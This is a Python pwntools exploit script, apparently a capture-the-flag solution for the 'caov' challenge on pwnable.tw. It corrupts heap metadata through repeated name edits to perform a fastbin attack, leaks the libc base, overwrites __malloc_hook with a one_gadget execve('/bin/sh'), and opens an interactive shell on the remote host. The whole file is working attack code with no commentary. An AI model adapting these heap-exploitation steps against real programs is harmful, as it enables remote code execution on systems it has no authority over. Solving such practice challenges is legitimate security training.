#!/usr/bin/env python3

from pwn import *

sla = lambda p, d, x: p.sendlineafter(d, x)
sa = lambda p, d, x: p.sendafter(d, x)
sl = lambda p, x: p.sendline(x)
s = lambda p, x: p.send(x)

slan = lambda p, d, n: p.sendlineafter(d, str(n).encode())
san = lambda p, d, n: p.sendafter(d, str(n).encode())
sln = lambda p, n: p.sendline(str(n).encode())
sn = lambda p, n: p.send(str(n).encode())

ru = lambda p, x: p.recvuntil(x)
rl = lambda p: p.recvline()
rn = lambda p, n: p.recvn(n)
rr = lambda p, t: p.recvrepeat(timeout=t)
ra = lambda p, t: p.recvall(timeout=t)
ia = lambda p: p.interactive()

lg = lambda t, addr: print(t, '->', hex(addr))
binsh = lambda libc: next(libc.search(b"/bin/sh\0"))
leak_bytes = lambda r, offset=0: u64(r.ljust(8, b"\0")) - offset
leak_hex = lambda r, offset=0: int(r, 16) - offset
leak_dec = lambda r, offset=0: int(r, 10) - offset
pad = lambda len=1, c=b'A': c * len

exe = ELF("caov_patched")
libc = ELF("libc_64.so.6")
ld = ELF("./ld-2.23.so")

context.terminal = ["/mnt/c/Windows/system32/cmd.exe", "/c", "start", "wt.exe", "-w", "0", "split-pane", "-V", "-s", "0.5", "wsl.exe", "-d", "Ubuntu-24.04", "bash", "-c"]
context.binary = exe

gdbscript = '''
cd ''' + os.getcwd() + '''
set solib-search-path ''' + os.getcwd() + '''
set sysroot /
set follow-fork-mode parent
set detach-on-fork on
b *malloc
b *0x401BF8
continue
'''

def conn():
    if args.LOCAL:
        p = process(['./ld-2.23.so', '--library-path', '.', './caov_patched'])
        sleep(0.1)
        if args.GDB:
            gdb.attach(p, gdbscript=gdbscript)
            sleep(1)
        return p
    else:
        host = "chall.pwnable.tw"
        port = 10306
        return remote(host, port)

p = conn()

def set_name(name):
    sla(p, b'your name', name)

def input_data(key, value):
    sla(p, b'ey:', key)
    slan(p, b'alue:', value)

def show():
    slan(p, b'choice', 1)

def edit(name, length, key, value):
    slan(p, b'choice', 2)
    set_name(name)
    slan(p, b'length', length)
    input_data(key, value)

set_name(b'ngtuonghung')
input_data(pad(), 0x1337)

name_addr = 0x6032c0

edit(flat({
    0x8: 0x71,
    0x60: name_addr + 0x10,
    0x78: 0x21,
}, filler=b'\0'), 8, pad(), 0x1337)

edit(flat({
    0x8: 0x71,
    0x10: name_addr - 0x3b,
    0x35 + 8: 0x21,
    0x60: 0,
}, filler=b'\0'), 0x60, pad(), 0x1337)

edit(flat({
    0x60: 0,
    0x68: 0x603280,
}, filler=b'\0'), 0x60, flat({
    0xb: name_addr + 0x68,
}, filler=b'\0'), 0x1337)

ru(p, b'after')
ru(p, b'Key: ')
libc.address = leak_bytes(rn(p, 6), libc.symbols['_IO_2_1_stderr_'])
lg("libc base", libc.address)

edit(flat({
    0x8: 0x71,
    0x60: name_addr + 0x10,
    0x68: name_addr,
    0x78: 0x21,
}, filler=b'\0'), 1, pad(), 0x1337)

edit(flat({
    0x8: 0x71,
    0x10: libc.symbols['__malloc_hook'] - 0x23,
    0x60: 0,
}, filler=b'\0'), 0x60, pad(), 0x1337)

'''
0xef6c4 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL
'''   

edit(flat({
    0x60: 0,
}, filler=b'\0'), 0x60, flat({
    0x13: libc.address + 0xef6c4,
}, filler=b'\0'), 0x1337)

ia(p)